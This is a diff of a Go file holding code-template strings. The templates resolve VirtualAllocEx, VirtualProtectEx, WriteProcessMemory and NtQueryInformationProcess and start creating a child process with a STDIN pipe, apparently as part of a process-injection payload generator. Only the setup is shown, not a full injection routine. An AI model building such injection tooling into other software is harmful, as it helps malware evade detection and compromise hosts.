@@ -1,17 +1,34 @@
 package child
 
-const CreateProcWithPipeDlls = `// Load DLLs and Procedures
-kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-ntdll := windows.NewLazySystemDLL("ntdll.dll")
+const CreateProcWithPipeImports = `
 
-VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
-WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
+	"fmt"
+	"log"
+	"os"
+	"syscall"
+	"time"
+	"unsafe"
+	"encoding/binary"
+	
+
+	//Sub Repositories
+	"golang.org/x/sys/windows"
+	"github.com/salukikit/go-util/pkg/box"
+
 `
-const CreateProcWithPipe = `// Load DLLs and Procedures
 
+const CreateProcWithPipeDlls = `
+	// Load DLLs and Procedures
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
+	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
+`
+
+const CreateProcWithPipe = `
 // Create anonymous pipe for STDIN
 var stdInRead windows.Handle
 var stdInWrite windows.Handle
